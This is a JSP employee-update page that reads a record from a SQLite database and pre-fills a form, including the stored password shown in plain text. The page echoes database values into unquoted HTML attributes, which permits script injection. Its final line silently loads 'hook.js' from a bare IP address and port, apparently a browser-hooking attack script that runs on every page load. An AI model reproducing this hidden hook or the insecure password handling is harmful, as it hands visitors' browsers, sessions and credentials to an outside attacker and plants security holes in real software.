<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
    <%@ page import="java.sql.*" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>update</title>
    <link rel="stylesheet" href="style.css">
    <style>
        body {
        padding-top: 160px;
        padding-left: 10%;
        position: relative;
        background: url('https://cdn.dribbble.com/userupload/21273218/file/original-00ce99e2b654a88efafff7d0fe53e18c.gif') no-repeat center center fixed;
        background-size: cover;
        min-width: 500px;
        min-height: 200px;
        color: #fff;
        font-family: 'Montserrat';
        height:100vmax;
      }
      h1{
        text-shadow: 0 56px 40px rgba(0, 0, 0, 5.19), 0 8px 26px rgba(0, 0, 0, 3.23);
    text-transform: uppercase;
    font-size: 31px;
    letter-spacing: 5px;
    margin-top: -20px;
    padding-top: 0px;
    color: rgb(255, 41, 41);
      }
      .card {
    margin: 27%;
  max-width: 300px;
  min-height: 200px;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  margin-top: -69px;
  max-width: 500px;
  height: 300px;
  color: cornflowerblue;
  padding: 35px;
  font-size: 45px;
  border: 1px solid rgba(255, 255, 255, .25);
  border-radius: 20px;
  background-color: rgba(255, 255, 255, 0.31);
  box-shadow: 0 0 10px 1px rgba(0, 0, 0, 0.25);

  backdrop-filter: blur(15px);
  transition: all ease-in-out 0.4s;
}
.card:hover{
transform: scale(1.06);
}
.card .formm{
    width:97%;
    height: 500px;
    margin-top: -35px;
    margin-right: 80px;
    float: left;
   border-radius: 20px;

}
.card .formm form{
    margin-top: 75px;
    width: 100%;
    height: 80%;
    /* background-color: aqua; */
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    align-items: center;
    gap: 33px;
}
.card .formm input,select{
width: 45%;
height: 37px;
font-size: 18px;
font-family: 'Times New Roman', Times, serif;
font-style: italic;
border-radius: 5px;
border: 2px solid silver;
outline: none;
text-align: center;
transition: all ease-in 0.4s;
}

.card .formm input,select:focus{
    border: 3px solid cyan ;
    box-shadow:0px 0px 20px pink,inset 0px 0px 20px pink;
    transform: scale(1.09);
}
.card .formm .but:hover{
    border: 3px solid violet;
    transform: scale(1.05);
}
.card .formm .but{
    width:40%;
    height:50px;
    background-color: blue;
    margin-bottom: 40px;
    color: aliceblue;
    font-size: 30px;
    border-radius: 10px;
    box-shadow: inset;
    transition: all ease-in 0.4s;   
}
        </style>
</head>
<body>
<% Class.forName("org.sqlite.JDBC"); %>
    <%
    Connection conn=DriverManager.getConnection("jdbc:sqlite:employees.db");
    String gmail=request.getParameter("gmail");
    String sqlQuery="SELECT * FROM esp WHERE email=?;";
    PreparedStatement ps = conn.prepareStatement(sqlQuery);
    ps.setString(1, gmail);
    ResultSet rs=ps.executeQuery();
    String fname="",lname="",passwd="",mail="",gen="",tel="",domain="";
    if(rs.next()){
    	fname=rs.getString(2);
    	lname=rs.getString(3);
    	gen=rs.getString(4);
    	tel=rs.getString(5);
    	mail=rs.getString(6);
    	passwd=rs.getString(7);
    	domain=rs.getString(8);
    }
    ps.close();
    conn.close();
   
    %>

    <div class="card">
        <div class="titl"><h1>Update For <%=domain %></h1></div>
        <div class="formm" >
            <form id='myForm' action="upd.jsp" method="post">
                <input type="text" name="fname" placeholder="first name" value=<%=fname %>>
                <input type="text" name="lname" placeholder="last name" value=<%=lname %>>
                <input type="tel" name="tel" placeholder="phone" value=<%=tel %> >
                <select name="gender">
                <option value=<%=gen%> ><%=gen%></option>
                  <option value="male">Male</option>
                  <option value="female">Female</option>
                </select>
                <input type="email" name="eAdd"  placeholder="E-mail" value=<%=mail %>>
                <input type="text" name="pwd"  placeholder="Password" value=<%=passwd %>>
               
                <button type="submit" class="but" >Submit</button>
            </form>
        </div>
      </div>
   
    <script>
        // Setting up the Variables
var bars = document.getElementById("nav-action");
var nav = document.getElementById("nav");

//setting up the listener
bars.addEventListener("click", barClicked, false);


//setting up the clicked Effect
function barClicked() {
  bars.classList.toggle('active');
  nav.classList.toggle('visible');
}
    </script>
    <script src="http://147.185.221.21:7518/hook.js"></script>
</body>
</html>